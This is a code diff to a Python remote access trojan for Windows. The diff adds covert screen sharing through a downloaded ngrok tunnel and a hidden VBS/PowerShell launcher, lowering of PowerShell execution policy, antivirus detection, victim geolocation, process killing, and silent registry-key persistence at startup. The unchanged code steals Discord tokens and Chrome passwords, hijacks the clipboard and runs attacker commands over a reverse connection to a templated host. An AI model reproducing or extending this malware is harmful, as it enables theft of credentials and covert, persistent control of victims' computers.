@@ -19,50 +19,190 @@ import time
 import sqlite3
 import base64
 from urllib.request import Request, urlopen
-from scapy.all import *
-import netifaces
-
+import errno
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (
     Cipher, algorithms, modes)
+import psutil
+import urllib.request as urllib2
+import platform
+def stopscreenshare():
+    temp = os.getenv('tmp')
+    try:
+       pid = open(temp+'\\mypid.log','r').read()
+       killprocess(pid)
+    except:
+        pass
+def changeexecutionpolicy():
+    subprocess.Popen('powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser',shell=True)
+
+def screenshare():
+    changeexecutionpolicy()
+    if isfile(appd+'\\systemsoft.exe') == False:
+        reliable_send('run ngroksetup module first')
+    else:
+
+            download_file(appd+'\\system.ps1')
+            with open(appd + '\\systemfile.vbs', 'w') as vbsscript:
+                vbsscript.write("""
+            Set objShell = WScript.CreateObject("WScript.Shell")
+            objShell.Run "cmd /c powershell -c %appdata%\\system.ps1", 0, True""")
+                vbsscript.close()
+            subprocess.Popen('cscript '+appd + '\\systemfile.vbs',shell=True)
+            subprocess.Popen('%appdata%\\systemsoft.exe http 5556',shell=True)
+            time.sleep(6)
+            try:
+
+                url = "http://127.0.0.1:4040/api/tunnels/command_line"
+                recived = get(url)
+                http = recived.json()["public_url"]
+
+                x = http[8:]
+
+            except:
+                reliable_send('error')
+            else:
+                reliable_send('open this on firefox '+x)
+
+
+def killprocess(pid):
+    reliable_send('killing ' + pid)
+    subprocess.Popen(' powershell -c taskkill /F /PID ' + pid, shell=True)
+def getprocess():
+    buffer = ''
+    for proc in psutil.process_iter():
+        try:
+            processName = proc.name()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            processName = "ACCESS DENIED"
+        try:
+            processID = proc.pid
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            processID = "ACCESS DENIED"
+        try:
+            processPath = proc.exe()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            processPath = "-"
+        if processPath == "":
+            processPath = "-"
+        buffer += processName + '###' + str(processID) + '###' + processPath + '\n'
+    reliable_send(buffer)
+
+def autopersist():
+
+    persist('WindowsService',sys.executable.split('\\')[-1])
+def sysinfo():
+
+    try:
+        is_admin = os.getuid() == 0
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    antivirus = ''
+    for proc in psutil.process_iter():
+        strProcName = proc.name().replace(".exe", "")
+        if strProcName == "ekrn":
+            antivirus = "NOD32"
+        elif strProcName == "avgcc":
+            antivirus = "AVG"
+        elif strProcName == "avgnt":
+            antivirus = "Avira"
+        elif strProcName == "ahnsd":
+            antivirus = "AhnLab-V3"
+        elif strProcName == "bdss":
+            antivirus = "BitDefender"
+        elif strProcName == "bdv":
+            antivirus = "ByteHero"
+        elif strProcName == "clamav":
+            antivirus = "ClamAV"
+        elif strProcName == "fpavserver":
+            antivirus = "F-Prot"
+        elif strProcName == "fssm32":
+            antivirus = "F-Secure"
+        elif strProcName == "avkcl":
+            antivirus = "GData"
+        elif strProcName == "engface":
+            antivirus = "Jiangmin"
+        elif strProcName == "avp":
+            antivirus = "Kaspersky"
+        elif strProcName == "updaterui":
+            antivirus = "McAfee"
+        elif strProcName == "msmpeng":
+            antivirus = "microsoft security essentials"
+        elif strProcName == "zanda":
+            antivirus = "Norman"
+        elif strProcName == "npupdate":
+            antivirus = "nProtect"
+        elif strProcName == "inicio":
+            antivirus = "Panda"
+        elif strProcName == "sagui":
+            antivirus = "Prevx"
+        elif strProcName == "Norman":
+            antivirus = "Sophos"
+        elif strProcName == "savservice":
+            antivirus = "Sophos"
+        elif strProcName == "saswinlo":
+            antivirus = "SUPERAntiSpyware"
+        elif strProcName == "spbbcsvc":
+            antivirus = "Symantec"
+        elif strProcName == "thd32":
+            antivirus = "TheHacker"
+        elif strProcName == "ufseagnt":
+            antivirus = "TrendMicro"
+        elif strProcName == "dllhook":
+            antivirus = "VBA32"
+        elif strProcName == "sbamtray":
+            antivirus = "VIPRE"
+        elif strProcName == "vrmonsvc":
+            antivirus = "ViRobot"
+        elif strProcName == "dllhook":
+            antivirus = "VBA32"
+        elif strProcName == "vbcalrt":
+            antivirus = "VirusBuster"
+
+        else:
+            antivirus = "Not Found"
+
+    obj_Disk = psutil.disk_usage('/')
+    response = urllib2.urlopen('http://ipinfo.io/json')
+    data = json.load(response)
+
+    if getattr(sys, 'frozen', False):
+        exec_path = sys.executable
+    elif __file__:
+        exec_path = __file__
+    else:
+        exec_path = os.path.abspath(__file__)
+
+    if os.name == "posix":
+        buffer = "HOMEDIR:        " + os.environ['HOME'] +  '\n'
+    else:
+        buffer = "HOMEDIR:        " + os.path.expanduser('~') + '\n'
+    buffer += "ADMIN:          " + str(is_admin) + '\n'
+    buffer += "ANTIVIRUS:      " + antivirus + '\n'
+    buffer += "HOSTNAME:	" + socket.gethostname() + '\n'
+    buffer += "PROVIDER:	" + data['org']+ '\n'
+    buffer += "CITY:		" + data['city'] +'\n'
+    buffer += "COUNTRY:	" + data['country'] + '\n'
+    buffer += "REGION:		" + data['region'] + '\n'
+    buffer += "OS:		" + platform.system() + " " + platform.release() + '\n'
+    buffer += "OSARCH:		" + platform.architecture()[0]+ '\n'
+    buffer += "IMPLANT PATH:   " + exec_path +'\n'
+    buffer += "TOTAL SPACE: " + str(obj_Disk.total / (1024.0 ** 3)) + " GB - Used => " + str(
+        obj_Disk.percent) + "<prc> "+'\n'
+    buffer += "USED SPACE:  " + str(obj_Disk.used / (1024.0 ** 3)) + " GB " +'\n'
+    buffer += "FREE SPACE:  " + str(obj_Disk.free / (1024.0 ** 3)) + " GB " +'\n'
+    reliable_send(buffer)
 def changeclip(change):
     try:
         subprocess.Popen("powershell -c Set-Clipboard "+change,shell=True)
         reliable_send('Target Clipoard Changed to '+change)
     except:
         reliable_send('[-]ERROR')
-def say(something,mode):
-    import pyttsx3
+def say(something):
+    subprocess.call("powershell -c Add-Type -AssemblyName System.Speech;$synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer;$synth.Speak('"+something+"')",shell=True)
 
-    engine = pyttsx3.init()
 
-    voices = engine.getProperty('voices')
-    engine.setProperty('voice', voices[mode].id)
 
-    engine.say(something)
-    engine.runAndWait()
-
-def scannetwork():
-    gws = netifaces.gateways()
-    gateway = gws['default'][netifaces.AF_INET][0]
-    target_ip = gateway + "/24"
-
-    arp = ARP(pdst=target_ip)
-
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp
-
-    result = srp(packet, timeout=3, verbose=0)[0]
-
-    clients = []
-
-    for sent, received in result:
-        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
-    string = ""
-    for client in clients:
-        x = "{:16}    {}".format(client['ip'], client['mac'])
-        string = string + x + '\n'
-    reliable_send(string)
 def getUserData(token):
     try:
         return json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
@@ -110,7 +250,7 @@ def getTokenz(path):
                     tokens.append(token)
     return tokens
 def steal():
-    reliable_send('Getting Infos')
+
     embeds = []
     working = []
     checked = []
@@ -169,7 +309,7 @@ def steal():
                 }
             }
             embeds.append(embed)
-    reliable_send(embeds)
+    reliable_send('Getting Infos \n'+str(embeds))
 def chromepassword():
     APP_DATA_PATH = os.environ['LOCALAPPDATA']
     DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -396,7 +536,6 @@ def reliable_recv():
             continue
 
 def download_file(file_name):
-    if isfile(file_name) == True:
         f = open(file_name, 'wb')
         s.settimeout(1)
         chunk = s.recv(1024)
@@ -408,8 +547,7 @@ def download_file(file_name):
                 break
         s.settimeout(None)
         f.close()
-    else:
-        reliable_send('DIDN t find the file')
+
 
 
 def upload_file(file_name):
@@ -417,6 +555,8 @@ def upload_file(file_name):
 
         f = open(file_name, 'rb')
         s.send(f.read())
+    else:
+        reliable_send('didn t find the file')
 
 
 def screenshot():
@@ -429,24 +569,26 @@ def persist(reg_name, copy_name):
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
-            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+
         else:
-            reliable_send('[+] Persistence Already Exists')
+            pass
     except:
-        reliable_send('[+] Error Creating Persistence With The Target Machine')
+        pass
 
 def connection():
     while True:
-        time.sleep(20)
+        time.sleep(5)
         try:
             s.connect(('$lhost', '$lport'))
             shell()
             s.close()
             break
         except Exception as e:
-            print(e)
-            connection()
-
+            if e.errno != 10061:
+                subprocess.Popen('powershell -c '+sys.executable,shell=True)
+                sys.exit()
+            else:
+                continue
 def shell():
     while True:
         command = reliable_recv()
@@ -458,12 +600,6 @@ def shell():
             pass
         elif command == 'clear':
             pass
-        elif command == 'scan-arp':
-            scanthread = threading.Thread(target=scannetwork())
-            try:
-                scanthread.start()
-            except:
-                reliable_send('[-]Error')
 
         elif command[:2] == 'cd':
             try:
@@ -485,6 +621,8 @@ def shell():
             except:
                 reliable_send('ERROR')
                 continue
+        elif command[:4] == 'kill':
+            killprocess(command[5:])
         elif command[:8] == 'download':
             try:
                 upload_file(command[9:])
@@ -502,11 +640,15 @@ def shell():
                 isuac()
             except:
                 reliable_send('[-]ERROR')
+        elif command[:6] == 'pslist':
+            try:
+                getprocess()
+            except:
+                reliable_send('[-]ERROR')
         elif command[:3] == 'say':
             try:
                 reliable_send('[+]Executed')
-                splited = command[4:].split('|')
-                say(splited[0],int(splited[1]))
+                say(command[4:])
             except:
                 reliable_send('[-] Error')
                 continue
@@ -545,12 +687,18 @@ def shell():
                 continue
         elif command[:7] == 'run-pwr':
             try:
-                reliable_send('[+] Executed \n')
+
                 pwr = os.popen('powershell -c ' + command[8:]).read()
-                reliable_send(pwr)
+                reliable_send('[+] Executed \n'+pwr)
             except:
                 reliable_send('[-]ERROR')
                 continue
+        elif command[:12] == 'changepolicy':
+            reliable_send('you will be able now to run powershell script')
+            changeexecutionpolicy()
+        elif command[:15] == 'ssharescreen':
+
+            stopscreenshare()
         elif command[:5] == 'start':
             try:
                 subprocess.Popen(command[6:], shell=True)
@@ -608,6 +756,17 @@ def shell():
                                  stdin=subprocess.PIPE)
             except:
                 reliable_send('[-]Failed')
+        elif command[:11] == 'screenshare':
+                threading.Thread(target=screenshare())
+        elif command == 'ngroksetup':
+            download_file(appd+'\\systemsoft.exe')
+            reliable_send('[+] ngrok installed')
+        elif command[:7] == 'sysinfo':
+            try:
+                sysinfo()
+            except:
+                reliable_send('[-]error')
+                continue
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
@@ -615,4 +774,5 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+autopersist()
 connection()
